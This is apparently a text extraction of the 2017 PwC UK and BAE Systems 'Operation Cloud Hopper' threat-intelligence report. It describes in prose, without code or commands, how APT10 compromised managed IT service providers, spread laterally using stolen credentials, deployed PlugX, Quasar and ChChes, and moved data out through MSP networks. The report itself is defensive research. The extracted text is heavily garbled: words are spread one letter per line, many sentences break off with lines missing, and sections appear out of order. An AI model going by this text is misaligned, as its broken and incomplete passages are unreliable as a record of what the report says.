\nM\nS\nP\nM\nS\nP\n \nc\nu\ns\nt\no\nm\ne\nr\nM\nS\nP\nT\na\nr\ng\ne\nt\ne\nd\nD\na\nt\na\nC\nu\ns\nt\no\nm\ne\nr\nu\ns\ne\nd\n \nf\no\nr\n \ne\nx\nl\nt\nr\na\nt\ni\no\nn\nA\nP\nT\n1\n0\nAPT10\ncompromises \n\nManaged IT \n\nService Providers\nMSP customers who \n\nalign to APT10\u2122s \n\n\n\naccessed by the threat \n\nactor using the MSPs \n\nlegitimate access\n\nwith stolen data are \n\nmoved from the MSP \n\ncustomer\u2122s network \n\nback onto the MSP \n\nnetwork\n\n\ndata back through \n\nMSPs  to infrastructure \n\ncontrolled by the threat \n\nactor\nData of interest to APT10 \n\nis accessed by the threat \n\nactor moving laterally \n\nthrough systems\nMSP customer data \n\ncollected by APT and \n\ncompressed, ready \n\n\n\nthe network\n 17\nAs part of the same campaign, we have also observed an email \nsent by APT10,\n13\n\nProgram, and targeting various Japanese education institutes \n\n\n14\n  and Chuo University.\n15\n The email \n\n\nfrom one of APT10\u2122s servers, the ChChes Powersploit exploit, \ndetailed in Annex B.\nInitial compromise and lateral \nmovement\nOnce on a target network, the actor rapidly deploys malware \nto establish a foothold, which may include one or more \n\nsystems that provide sustained access to a victim\u2122s network. \nAs APT10 works to gain further privileges and access, it also \nconducts internal reconnaissance, mapping out the network \n\nusing common Windows tools, and in later stages of the \n\ncompromise using open source pentesting tools, detailed in \n\nAnnex B.\nThis reconnaissance is run in parallel with the actor ensuring \nthat it has access to legitimate credentials. We have observed \n\n\nit continues to use the MSPs credentials. In order to gain any \nfurther credentials, APT10 will usually deploy credential theft \n\n\n\n\n\n\nexecuted in order to maintain this level of access. In most \ncases, these stolen MSP credentials have provided \n\nadministrator or domain administrator privileges. \nWe have observed the threat actor copying malware over to \nsystems in a compromised environment, which did not have \n13\n\n14\n\n15\n\nany outbound internet access. In one of these instances, the \nthreat actor spent more than an hour attempting to establish \n\nan outbound connection using PlugX until it realised that the \nhost had no internet access, at which point the malware and \n\n\non its targets primarily by using scheduled tasks or Windows \n\nservices in order to ensure the malware remains active \n\nregardless of system reboots.\nAPT10 heavily leverages the shared nature of client-side MSP \ninfrastructure to move laterally between MSPs and other \n\nvictims. Systems that share access and thus credentials, from \nboth a MSP and one of its clients serve as a way of hopping \nbetween the two.\nC\nl\ni\ne\nn\nt\n \ni\nn\nf\nr\na\ns\nt\nr\nu\nc\nt\nu\nr\ne\nM\nS\nP\n \ni\nn\nf\nr\na\ns\nt\nr\nu\nc\nt\nu\nr\ne\nSystems sharing credentials across the client and the \nMSP are of particular interest to APT10, and are \n\ncommonly used by the threat actor in order to gain \n\naccess to new areas of the network\n\n2009\n2017\n2016\n2014\n2013\n2009\n\n\n\n\n\n\n2014\n\n\n\n\n\n\n\n\nQ4 2014\n\n\n\n\nQ4 2016\n\n\n\n\nQ1 2017\n\n\n\n\n\n\n\n\nAugust 2013\n\n\n\n\n\n\n\n\nMarch 2014\n\n\n\n\n\n\n\n\n\n\nLegend\n\n\nSummary of APT10 activity\nFigure 15: Timeline of APT10 related activities\n 18\n\nsystems to gain network persistence and a high level of access \n\nrespectively. For example, in addition to compromising high \nvalue domain controllers and security servers, the threat actor \nhas also been observed identifying and subsequently \n\n\n\nnon-critical support functions to the business, and are thus \n\nless likely to draw the attention of system administrators.\nAs part of the long-term access to victim networks, we have \nobserved APT10 consistently install updates and new \n\n\n\nto install its malware; the actor also uses these methods to \n\npropagate across the network. \nCommunication checks are usually conducted using native \nWindows tools such as ping.exe, net.exe and tcping.exe. The \nactor will frequently \u201anet use\u2122 to several machines within \n\n\n\ndisconnecting. Further details are provided in Annex B.\nNetwork hopping and \n\nOnce APT10 have a foothold in victim networks, using either \nlegitimate MSP or local domain credentials, or their sustained \n\n\nbegin to identify systems of interest.\n\n\n\nfunctionality, to identify data of interest. This data is then \n\n\n\ntools are often launched via a remote command execution \n\nscript which is regularly named \u201at.vbs\u2122 and is a customised \nversion of an open source WMI command executor which \npipes the command output back to the operator.\nWe have observed these archives being moved outside of the \nvictim networks, either back into to the MSP environments or \nto external IP addresses in two methods, which are also \nperformed via the command line using t.vbs:\n1.\n \nMounting the target external network share with \u201anet use\u2122 \n\n\n\ntransfer the data; and,\n2.\n \nUsing the legitimate Putty Secure Copy Client (PSCP), \nsometimes named rundll32.exe, to transfer the data \n\ndirectly to the third party system.\nUsing these techniques, APT10 \u201apushes\u2122 data from victim \n\nnetworks to other networks they have access to, such as other \n\nMSP or victim networks, then, using similar methods, \u201apulls\u2122 \n\nthe data from those networks to locations from which they \n\ncan directly obtain it, such as the threat actor\u2122s C2 servers.\nAPT10\u2122s ability to bridge networks can therefore be \nsummarized as:\n\u0141\n \nUse of legitimate MSP credentials to management systems \n\nwhich bridge the MSP and multiple MSP customer \n\nnetworks;\n\u0141\n \n\n\nmanagement network and MSP customer networks;\n\u0141\n \nUse of t.vbs to execute command line tools; and,\n\u0141\n \n\nAPT10 malware\nWe classify APT10\u2122s malware into two distinct areas: tactical \n\nand sustained. The tactical malware, historically EvilGrab, \n\n\nlightweight and disposable, often being delivered through \nspear phishing. Once executed, tactical malware contains the \n\n\n\nidentify a key system of interest. The sustained malware, \n\nhistorically Poison Ivy, PlugX and now Quasar provides a more \ncomprehensive feature set. Intended to be deployed on key \nsystems, the sustained malware facilitates long-term remote \n\naccess and allows for operators to more easily carry out \n\nadministration tasks.\nSince late 2016, we have seen the threat actor develop several \n\n\nAdditionally, it has taken the open source malware, Quasar, \n\nand extended its capabilities, ensuring the incrementation of \nthe internal version number as it does so.\n\n\n\nopen-source tools. For example, PwC UK has observed APT10 \n\nand using legitimate, signed software, such as Windows \n\nDefender to load the malicious payloads.\nIn Annex B we provide detailed analysis of several of the \nthreat actor\u2122s tools as well as the common Windows tools we \nhave observed being used. \n 19\nTimeline \nFigure 17: Timeline of APT10 malware use\n16\n\n2009\n2010\n2011\n2012\n2013\n2014\n2015\n2016\n2017\nPoison Ivy\nPlugX\nEvilGrab\nChChes\n\nQuasar\nRedLeaves\nRetooling Efforts \nAlongside APT10\u2122s TTPs, we have observed a \u201aretooling\u2122 cycle. \nGiven the pace of technological change and the wide range of \n\nfreely available online tools and scripts, it is not unusual for \nan actor to re-evaluate its capabilities and to benchmark \nmultiple offerings against each other. We have observed a \n\ndecline in the deployment of some of APT10\u2122s traditional core \n\ntool set, and witnessed an increase in the development and \n\ndeployment of additional new tools which combine in-house \n\nhighly likely due to the public release of APT10 malware by \n\ncyber security vendors.\nThroughout our investigations, we have observed multiple \ndeployments of the PlugX malware from 2014 to at least 2016. \n\nThis, along with the downturn in the use of Poison Ivy, \n\n\n\nplace post 2014. Additional analysis of the infrastructure \nassociated with each distinct version of PlugX also shows an \nincrease in maturity over time. Earlier PlugX versions were \n\n\n\noriginally isolated and more obvious, whereas more recent \n\nversions have demonstrated a standardised convention for \ndomain names and IP selection. \nDuring our analysis of victim networks, we were able to \nobserve APT10 once again initiate a retooling cycle in late \n\n2016. We observed the deployment and testing of multiple \nversions of Quasar malware,\n16\n and the introduction of the \n\nWe assess it is highly likely that due to the frequent public \nrelease of information linking PlugX with China-based threat \n\nactors, continual long-term use had become unsustainable, \n\nintroducing an additional operational overhead that is easily \n\nattributable to China-based threat actors.\n 20\nConclusion\nAPT10 is a constantly evolving, highly \npersistent China-based threat actor that \nhas an ambitious and unprecedented \ncollection programme against a broad \nspectrum of sectors, enabled by its \nstrategic targeting.\nSince exposure of its operations in 2013, APT10 has made a \n\n\nits campaigns. PwC UK and BAE Systems, working closely \nwith industry and government, have uncovered a new, \nunparallelled campaign which we refer to as Operation Cloud \n\nHopper. This operation has targeted managed IT service \n\nproviders, the compromise of which provides APT10 with \n\npotential access to thousands of further victims. An additional \ncampaign has also been observed targeting Japanese entities.\nAPT10\u2122s malware toolbox shows a clear evolution from \nmalware commonly associated with China-based threat actors \ntowards bespoke in-house malware that has been used in \nmore recent campaigns; this is indicative of APT10\u2122s \n\nincreasing sophistication, which is highly likely to continue. \n\nThe threat actor\u2122s known working hours align to Chinese \n\nStandard Time (CST) and its targeting corresponds to that of \nother known China-based threat actors, which supports our \nassessment that these campaigns are conducted by APT10. \nThis campaign serves to highlight the importance of \norganisations having a comprehensive view of their threat \n\n\n\nit should also encourage organisations to fully assess the \n\nrisk posed by their third party relationships, and prompt \nthem to take appropriate steps to assure and manage these.\nA detailed technical annex supplements this main report, \nwhich provides further information about the tools and \n\ntechniques used by APT10 and contains Indicators of \nCompromise relating to all of this threat actor\u2122s known \ncampaigns. These have already been provided to the National \n\nCyber Security Centre for dissemination through their usual \n\nchannels.  \n 21\nAppendices\n 22\nAppendix A\nCollaboration between PwC UK and BAE Systems\nPwC and BAE Systems\u2122 respective Threat Intelligence teams share a mutual interest in new cyber threats. PwC and BAE \n\n\nthe most comprehensive picture possible of this threat actor\u2122s activities. Information sharing like this underpins the security \nresearch community and serves to aid remediation and inform decisions that companies make about their security needs.\nProbabilistic language\nInterpretations of probabilistic language (for example, \ufb01likely\ufb02 or \ufb01almost certainly\ufb02) vary widely, and to avoid \n\n\nhave in our assessments. Unless otherwise stated, our assessments are not based on statistical analysis.\nQualitative term\nAssociated probability range\n\n\n\n\n\n\n\n\n\n\n\n\nTable 4: Probabilistic language\n 23\nAppendix B\nPwC UK reporting\nPwC UK Threat Intelligence has previously published a range \nof APT10 related reporting, both in the public domain and via \n\nour subscription service. These reports are as follows:\n\u0141\n \nAPT10 resumes operations with a vengeance\n, in \nThreats Under the Spotlight \u0152 CTO-TUS-20170321-01A \n\u0141\n \nNetEaseX and the Secret Key to Lisboa\n \u0152 CTO-TIB-\n\n\n\u0141\n \nAPT10\u2122s .NET Foray\n \u0152 CTO-TIB-20170301-01B \u0152 Quasar\n\u0141\n \nAPT10 pauses for Chinese New Year\n, in Threats Under \nthe Spotlight \u0152 CTO-TUS-20170220-01A\n\u0141\n \nCVNX\u2122s sting in the tail\n \u0152 CTO-TIB-20170123-01A \u0152 \n\nChChes (Scorpion) Malware \n\u0141\n \nChina and Japan: APT to dispute \n-CTO-SIB-20170119-\n\n01A\n\u0141\n \nTaiwan Presidential Election: A Case Study on \n\nThematic Targeting,\n http://pwc.blogs.com/cyber_\nsecurity_updates/2016/03/taiwant-election-targetting.\nhtml, published 2016-03-17. Overview of EvilGrab and it \n\n\n2016 Taiwanese election\n\u0141\n \nScanbox II \n\u0152 CTO-TIB-20150223-01A \n\u0141\n \n\n Red Apollo Tearsheet\n\ufb02\nThird party reports \nA number of organisations have also published related \n\nreporting, as follows:\n\u0141\n \nRedLeaves \u0152 Malware Based on Open Source RAT\n \n\n\n\nbased-on-open-source-rat.html \u0152 Further technical \n\n\n\u0141\n \nThe relevance between the attacker group menuPass \n\nand malware (Poison Ivy, PlugX, ChChes)\n, https://\n\n\nand PlugX.\n\u0141\n \nmenuPass Returns with New Malware and New \n\nAttacks Against Japanese Academics and \n\nOrganizations,\n http://researchcenter.paloaltonetworks.\ncom/2017/02/unit42-menupass-returns-new-malware-\n\n\n\npublished 2017-02-16. APT10 attacks on Japanese \n\nacademics. Includes info on ChChes (technical), Poison Ivy \n\nand PlugX.\n\u0141\n \nChChes \u0152 Malware that Communicates with C&C \n\nServers Using Cookie Headers\n\n\n2017-02-15. Technical overview of ChChes malware with \nIOCs. \n\u0141\n \nPlugX TrendMicro \ufb01tearsheet\ufb02\n, https://www.\ntrendmicro.com/vinfo/us/threat-encyclopedia/malware/\n\nplugx, published 2016-09-07. Technical info and IOCs for \nPlugX.\n\u0141\n \nA Detailed Examination of the Siesta Campaign\n, \n\nthreat-research/2014/03/a-detailed-examination-of-the-\nsiesta-campaign.html, published 2014-03-12. Provides a \ndetailed analysis of activity dubbed the Siesta campaign.\n\u0141\n \nPOISON IVY: Assessing Damage and Extracting \n\nIntelligence\n\n\nivy.pdf, published 2013-08-21. Technical report on Poison \nIvy and campaigns that have used it, including menuPass.\n\u0141\n \nEvilGrab Malware Family Used In Targeted Attacks In \n\nAsia\n, http://blog.trendmicro.com/trendlabs-security-\nintelligence/evilgrab-malware-family-used-in-targeted-\nattacks-in-asia/, published 2013-09-18. Technical \noverview of EvilGrab.\n\u0141\n \nCrowdCasts Monthly: You Have an Adversary Problem\n, \nhttps://www.slideshare.net/CrowdStrike/crowd-casts-\n\nmonthly-you-have-an-adversary-problem, published \n2013-10-16, a presentation on Chinese actors including \nAPT, crime and hacktivist. Includes section on Stone \n\nPanda (APT10).\n\u0141\n \nPlugX: New Tool For a Not So New Campaign\n, http://\nblog.trendmicro.com/trendlabs-security-intelligence/\n\nplugx-new-tool-for-a-not-so-new-campaign/, published \n2012-09-10. Gives an introduction to PlugX.\n\u0141\n \nPulling the Plug on PlugX\n, https://www.trendmicro.\ncom/vinfo/us/threat-encyclopedia/web-attack/112/\npulling-the-plug-on-plugx, published 2012-08-04. Gives a \ntechnical overview of PlugX and what it is used for.\n About PwC\nAt PwC, our purpose is to build trust in society and solve important \n\n223,000 people who are committed to delivering quality in assurance, \n\nadvisory and tax services. \nPwC UK\u2122s cyber security team is a part of this mission, helping clients \naround the world to assess, build and manage their cyber security \n\ncapabilities and to identify and respond to incidents through a range \n\nof services including threat intelligence, threat detection and incident \nresponse.\nWe are BAE Systems\nAt BAE Systems, we provide some of the world\u2122s most advanced \ntechnology defence, aerospace and security solutions.\nAt BAE Systems Applied Intelligence, we help nations, \ngovernments and businesses around the world defend \n\nthemselves against cybercrime, reduce their risk in the \n\nconnected world, comply with regulation, and transform their \n\noperations.  We do this using our unique set of solutions, \n\nsystems, experience and processes \u0152 often collecting and \n\nanalysing huge volumes of data.\n This publication has been prepared for general guidance on matters of interest only, and does not constitute professional advice. You should not act \n\n\n\n\n\n\nacting, or refraining to act, in reliance on the information contained in this publication or for any decision based on it. \n\n\n\n ", "Operation \nCloud Hopper\nwww.pwc.co.uk/cyber\nExposing a systematic \nhacking operation with an \n\nunprecedented web of \nglobal victims\nApril 2017\nIn collaboration with\n 2\nContents\nForeword\n \n3\nExecutive summary\n \n4\nAPT10 as a China-based threat actor\n \n5\nMotivations behind APT10\u2122s targeting\n \n14\nShining a light on APT10\u2122s methodology\n \n16\nConclusion\n \n20\nAppendices\n \n21\n 3\nForeword\nThis report is an initial public release of research PwC UK and \nBAE Systems have conducted into new, sustained global \ncampaigns by an established threat actor against managed IT \nservice providers and their clients as well as several directly \ntargeted organisations in Japan. Given the scale of those \n\nsmall portion of the threat actor\u2122s operations. \nThis report is primarily fact-based. Where we have made an \nassessment this has been made clear by phraseology such as \ufb01we \nassess\ufb02, and the use of estimative language as outlined in \nAppendix A.\nBy publicly releasing this research, PwC UK and BAE Systems \nhope to facilitate broad awareness of the attack techniques used \n\naccordingly. It is also hoped that rapid progress can be made \nwithin the broader security community to further develop the \n\nunderstanding of the campaign techniques we outline, leading to \nadditional public reports from peers across the security \ncommunity.\nAs a part of our research and reporting effort, PwC UK and BAE \nSystems have collaborated with the UK\u2122s National Cyber Security \n\nscheme to engage and notify managed IT service providers, \nknown affected organisations and other national bodies.\nSupplementary to this report, an Annex containing our technical \nanalysis will be released.\n 4\nExecutive summary\nSince late 2016, PwC UK and BAE Systems have been assisting victims of a new cyber espionage campaign conducted by a \nChina-based threat actor. We assess this threat actor to almost certainly be the same as the threat actor widely known within \n\nthe security community as \u201aAPT10\u2122. The campaign, which we refer to as Operation Cloud Hopper, has targeted managed IT \nservice providers (MSPs), allowing APT10 unprecedented potential access to the intellectual property and sensitive data of \nthose MSPs and their clients globally. A number of Japanese organisations have also been directly targeted in a separate, \n\nsimultaneous campaign by the same actor.\n\nAPT10 has recently unleashed a sustained campaign \nagainst MSPs. The compromise of MSP networks has \n\nprovided broad and unprecedented access to MSP customer \n\nnetworks.\n\u0141\n \nMultiple MSPs were almost certainly being targeted from \n\n2016 onwards, and it is likely that APT10 had already \n\nbegun to do so from as early as 2014.\n\u0141\n \nMSP infrastructure has been used as part of a complex web \n\n\n\n\nsince early 2016, including the addition of new custom \n\ntools. \n\u0141\n \nAPT10 ceased its use of the Poison Ivy malware family \n\nafter a 2013 FireEye report, which comprehensively \n\ndetailed the malware\u2122s functionality and features, and its \nuse by several China-based threat actors, including APT10.\n\u0141\n \nAPT10 primarily used PlugX malware from 2014 to 2016, \nprogressively improving and deploying newer versions, \n\nwhile simultaneously standardising their command and \ncontrol function. \n\u0141\n \nWe have observed a shift towards the use of bespoke \nmalware as well as open-source tools, which have been \n\ncustomised to improve their functionality. This is highly \nlikely to be indicative of an increase in sophistication.\nInfrastructure observed in APT10\u2122s most recent campaigns \nlinks to previous activities undertaken by the threat actor. \n\u0141\n \n \nThe command and control infrastructure used for \nOperation Cloud Hopper is predominantly dynamic-DNS \n\ndomains, which are highly interconnected and link to the \n\nthreat actor\u2122s previous operations. The number of \ndynamic-DNS domains in use by the threat actor has \n\n\nincrease in operational tempo. \n\u0141\n \n \nSome top level domains used in the direct targeting of \nJapanese entities share common IP address space with the \n\nnetwork of dynamic-DNS domains that we associate with \n\nOperation Cloud Hopper. \nAPT10 focuses on espionage activity, targeting intellectual \n\nproperty and other sensitive data.\n\u0141\n \n\n\nfrom multiple victims, exploiting compromised MSP \n\nnetworks, and those of their customers, to stealthily move \nthis data around the world. \n\u0141\n \n\nalong with the volume of the data, is reminiscent of the \n\nprevious era of APT campaigns pre-2013. \nPwC UK and BAE Systems assess APT10 as highly likely to \n\nbe a China-based threat actor.\n\u0141\n \nIt is a widely held view within the cyber security \n\ncommunity that APT10 is a China-based threat actor.\n\u0141\n \nOur analysis of the compile times of malware binaries, the \n\nregistration times of domains attributed to APT10, and the \n\n\nin line with China Standard Time (UTC+8). \n\u0141\n \nThe threat actor\u2122s targeting of diplomatic and political \norganisations in response to geopolitical tensions, as well \n\n\nclosely aligned with strategic Chinese interests.\n 5\nAPT10 as a China-based threat actor\nAPT10 as a China-based threat actor\n1\n \nT\nhe defence industrial base comprises the US Department of Defense and a plethora of companies that support the design, development and \nmaintenance of defence assets and enable US military requirements to be met. https://www.dhs.gov/defense-industrial-base-sector\n\n3\n \nhttp://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/\nPwC UK and BAE Systems assess it is highly likely that APT10 \nis a China-based threat actor with a focus on espionage and \n\nwide ranging information collection. It has been in operation \nsince at least 2009, and has evolved its targeting from an early \nfocus on the US defence industrial base (DIB)\n1\n and the \ntechnology and telecommunications sector, to a widespread \n\ncompromise of multiple industries and sectors across the \nglobe, most recently with a focus on MSPs.\nAPT10, a name originally coined by FireEye, is also referred to \n\n\nPanda by CrowdStrike, and menuPass Team more broadly in \nthe public domain. The threat actor has previously been the \n\n\nnotably a report by FireEye comprehensively detailing the \n\nthreat actor\u2122s use of the Poison Ivy malware family\n2\n and blog \nposts by Trend Micro\n3\n similarly detailing the use of EvilGrab \nmalware.\nAlongside the research and ongoing tracking of APT10 by \nboth PwC UK and BAE\u2122s Threat Intelligence teams, PwC UK\u2122s \n\n\n\ninvestigations linked to APT10 compromises. This research \n\nhas contributed to the assessments and conclusions we have \ndrawn regarding the recent campaign activity by APT10, \nwhich represents a shift from previous activities linked to the \n\nthreat actor.\nAs a result of our analysis of APT10\u2122s activities, we believe that \n\n\n\nlogistical resources, which have increased over the last three \n\n\n\nof the threat actor\u2122s operations throughout 2016 and 2017, we \nsimilarly assess it currently comprises multiple teams, each \nresponsible for a different section of the day-to-day \n\noperations, namely domain registration, infrastructure \n\nmanagement, malware development, target operations, and \nanalysis.\nAPT10 withdrew from direct targeting using Poison Ivy in \n\n\nupgrading its capabilities and replatforming to use PlugX. It is \nhighly likely that this is due to the release of the 2013 FireEye \nreport.\nOur report will detail the most recent campaigns conducted \nby APT10, including the sustained targeting of MSPs, which \nwe have named Operation Cloud Hopper, and the targeting of \na number of Japanese institutions. \n 6\nTime-based analysis of APT10\u2122s operations\n4\n \nT\nhe bubbles shown on Figures 1 through 6 are representative of the number of events observed at that time and date.\nAs part of our analysis, we have made a number of \n\n\nassessment that APT10 is a China-based threat actor. For \n\n\n\nAPT10 activity. This is almost certainly indicative of a threat \n\nactor based in the UTC+8 time zone, which aligns to Chinese \n\nStandard Time (CST).\nShown in Figure 1 are registration times\n4\n, represented in UTC, \nfor known APT10 top level domains since mid-2016, which \n\n\nMapping this to UTC+8, as in Figure 2, shows a standard set \nof Chinese business hours, including a two-hour midday \n\nbreak.\n\n\nQuasar malware samples used by APT10 reveals a similar \n\npattern in working hours, as shown in Figure 3.\nShifting this to UTC+8 shows a similar timeframe of \n\noperation to the domain registrations. There are some \n\noutliers, which are likely attributable to the operational \n\nnature of this threat actor, such as requirements to work \n\noutside normal business hours.\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nJul 2017\nJan 2017\nJan 2016\nJan 2015\nJan 2014\nJul 2015\nJul 2015\nJul 2014\nJul 2013\nTime of Day (UTC)\nDate (days)\nFigure 3: Compile times of PlugX, RedLeaves and Quasar in UTC\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nApr 2017\nMar 2017\nJan 2017\nNov 2016\nSep 2016\nFeb 2017\nDec 2016\nOct 2016\nAug 2016\nTime of Day (UTC+8)\nDate (days)\nFigure 2: APT10 domain registration times in UTC+8\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nApr 2017\nMar 2017\nJan 2017\nNov 2016\nSep 2016\nFeb 2017\nDec 2016\nOct 2016\nAug 2016\nTime of Day (UTC)\nDate (days)\nFigure 1: APT10 domain registration times in UTC\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nTime of Day (UTC+8)\nDate (days)\nJul 2017\nJan 2017\nJan 2016\nJan 2015\nJan 2014\nJul 2015\nJul 2015\nJul 2014\nJul 2013\nFigure 4: Compile times of PlugX, RedLeaves and Quasar in UTC+8\n 7\nTo further this analysis, we have observed the threat actor \nconducting interactive activities primarily between the hours \n\nof midnight and 10:00 UTC, as shown in Figure 7. When \nconverting this to UTC+8 we again see a shift to Chinese \nbusiness hours, with operations occurring between 08:00 and \n\n19:00. It is a realistic probability that the weekend work \n\nobserved in Figure 7 may be necessary as part of operational \n\nrequirements.  \nThe sum of this analysis aligns with the evidence provided by \nthe United States Department of Justice indictment against \n\nseveral individuals associated with APT1,\n5\n another China-\nbased threat actor, showing a working day starting at 08:00 \n\n\nbreak from 12:00 UTC+8 until 14:00 UTC+8.\n\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nDec 15, 2016\nDec 1, 2016\nNov 17, 2016\nNov 3, 2016\nOct 20, 2016\nOct 6, 2016\nSep 22, 2016\nTime of Day (UTC+8)\nDate (days)\nFigure 6: \nCompile time of ChChes in UTC+8\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nDec 15, 2016\nDec 1, 2016\nNov 17, 2016\nNov 3, 2016\nOct 20, 2016\nOct 6, 2016\nSep 22, 2016\nTime of Day (UTC)\nDate (days)\nFigure 5: Compile time of ChChes in UTC\nWhen applying the time shift to the ChChes malware (newly \nused by APT10) compilation timestamps, we see a different \n\npattern as shown in Figure 5. While this does not align with \nChinese business hours, it is likely to be either a result of the \n\n\n\nended up being used on targeted operations. Based on other \n\ntechnical overlaps, ChChes is highly likely to be exclusively \nused by APT10.\n23\n:\n00\n0\n1\n:\n0\n0\n0\n2\n:\n0\n0\n03\n:\n00\n04\n:\n00\n0\n5\n:\n0\n0\n0\n6\n:\n0\n0\n07\n:\n00\n0\n8\n:\n0\n0\n0\n9\n:\n0\n0\n1\n0\n:\n0\n0\n11\n:\n00\n1\n2\n:\n0\n0\n1\n3\n:\n0\n0\n1\n4\n:\n0\n0\n1\n5\n:\n0\n0\n1\n6\n:\n0\n0\n1\n7\n:\n0\n0\n18\n:\n00\n1\n9\n:\n0\n0\n2\n0:\n0\n0\n2\n1\n:\n0\n0\n22\n:\n00\n00\n:\n00\nM\no\nn\nT\nu\ne\nW\ne\nd\nT\nh\nu\nr\nF\nr\ni\nS\na\nt\nS\nu\nn\nFigure 7: Operational times of APT10 in UTC+8\nNumber of events\n0\n1-10\n11-20\n21-30\n31-40\n41-50\n50+\n 8\nIdentifying a change in APT10\u2122s \ntargeting\nAPT10 has, in the past, primarily been known for its \ntargeting of government and US defence industrial base \n\norganisations, with the earliest known date of its activity \nbeing in December 2009. Our research and observations \nsuggest that this targeting continues to date.\nDuring the 2013 \u0152 2014 period there was a general downturn \nin the threat actor\u2122s activities, as was also seen with other \nrelated groups. It was widely assessed that this was due to \nthe public release of information surrounding APT1, which \n\nexposed its toolset and infrastructure.  \n\n\n\none targeting MSPs and their clients, and one directly \n\ntargeting Japanese entities.\nMSP focused campaign\nAPT10 has almost certainly been undertaking a \nglobal operation of unprecedented size and scale \n\ntargeting a number of MSPs. \nAPT10 has vastly increased the scale and scope of its \ntargeting to include multiple sectors, which has likely been \n\nfacilitated by its compromise of MSPs. Such providers are \nresponsible for the remote management of customer IT and \nend-user systems, thus they generally have unfettered and \n\ndirect access to their clients\u2122 networks. They may also store \n\n\n\ninfrastructure.\nMSPs therefore represent a high-payoff target for espionage-\nfocused threat actors such as APT10. Given the level of client \n\nnetwork access MSPs have, once APT10 has gained access to \na MSP, it is likely to be relatively straightforward to exploit \nthis and move laterally onto the networks of potentially \n\nthousands of other victims. This, in turn, would provide \n\naccess to a larger amount of intellectual property and \n\n\nintellectual property via the MSPs, hence evading local \nnetwork defences. \n6\n \nhttps://security.googleblog.com/2011/08/update-on-attempted-man-in-middle.html\n7\n \nhttps://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/\n\nOther threat actors have previously been observed using\n \n\na similar method of a supply chain attack, for example, in\n \n\n\n2011\n6\n and the compromise of US retailer Target in 2013.\n7\n \nThe command and control (C2) infrastructure chosen by \nAPT10 for Operation Cloud Hopper is predominantly \n\nreferenced using dynamic-DNS domains. The various \ndomains are highly-interconnected through shared IP \naddress hosting, even linking back historically to the threat \n\nactor\u2122s much older operations.\nAt present, the indicators detailing APT10\u2122s operations \nnumber into the thousands and cannot be easily visualised. \nThe graph in Figure 8 overleaf depicts a high-level view of the \n\ninfrastructure used by APT10 throughout 2016. As the \n\ncampaign has progressed into 2017, the number of dynamic-\n\nincreased.\nThe graph in Figure 9, also shown overleaf, extracts one node \nof the newer C2 from the infrastructure shown in Figure 8 \nand maps this to the older infrastructure of APT10, as \ndisclosed by FireEye in their 2014 Siesta  Campaign blog \n\npost\n8\n. In terms of timing, it is highly likely that a single party \nis responsible for all of these domains, based on our \n\nobservations of infrastructure overlap.\n\n\n\nof these provide enterprise services or cloud hosting, \n\nsupporting our assessment that APT10 are almost certainly \ntargeting MSPs. We believe that the observed targeting of \nMSPs is part of a widescale supply-chain attack.\n 9\nFigure 8: High-level view of infrastructure used by APT10 throughout 2016\nFigure 9: Infrastructure graph linking early Plugx domains to recent APT10 domains\n 10\nCountries targeted\nB\nu\ns\ni\nn\ne\ns\ns\n \na\nn\nd\n \nP\nr\no\nf\ne\ns\ns\ni\no\nn\na\nl\n \nS\ne\nr\nv\ni\nc\ne\ns\nE\nn\ne\nr\ng\ny\n \na\nn\nd\n \nM\ni\nn\ni\nn\ng\nM\ne\nt\na\nl\ns\nP\nh\na\nr\nm\na\nc\ne\nu\nt\ni\nc\na\nl\ns\n \na\nn\nd\n \nL\ni\nf\ne\n \nS\nc\ni\ne\nn\nc\ne\nP\nu\nb\nl\ni\nc\n \ns\ne\nc\nt\no\nr\nR\ne\nt\na\ni\nl\n \na\nn\nd\n \nC\no\nn\ns\nu\nm\ne\nr\nT\ne\nc\nh\nn\no\nl\no\ng\ny\nI\nn\nd\nu\ns\nt\nr\ni\na\nl\n \nm\na\nn\nu\nf\na\nc\nt\nu\nr\ni\nn\ng\nE\nn\ng\ni\nn\ne\ne\nr\ni\nn\ng\n \na\nn\nd\n \nC\no\nn\ns\nt\nr\nu\nc\nt\ni\no\nn\nSectors targeted\nIndia\nBrazil\nUSA\nCanada\nJapan\nSouth Korea\nAustralia\nSouth Africa\nFinland\nSweden\nNorway\nSwitzerland\nFrance\nThailand\n 11\nJapan focused campaign\n\nIn a separate series of operations, APT10 has been \nsystematically targeting Japanese organisations using \n\nbespoke malware referred to in the public domain as \u201aChChes\u2122. \nWhile linked to APT10, via shared infrastructure, this \ncampaign exhibits some operational differences suggesting a \n\npotential sub-division within the threat actor. These \n\noperations have seen APT10 masquerading as legitimate \n\nJapanese public sector entities (such as the Ministry of Foreign \nAffairs, Japan International Cooperation Agency and the \n\n\norganisations. \nTargeting of these entities by APT10 is consistent with \nprevious targeting by China-based threat actors of a wide \n\nrange of industries and sectors in Japan. This includes the \n\ntargeting of commercial companies, and government \n\n\namounts of data.\n9\n \nAPT10\u2122s standard compromise methodology begins with a \nspear phishing email sent to the target, usually with an \nexecutable attachment designed to lure the victim to open it. \n\n\n\nAPT10 malware samples, particularly from late 2016, \n\n\nclearly indicates a campaign targeting Japanese-speaking \n\n\nAnnex B.\n\nin this campaign.\n\nJapanese 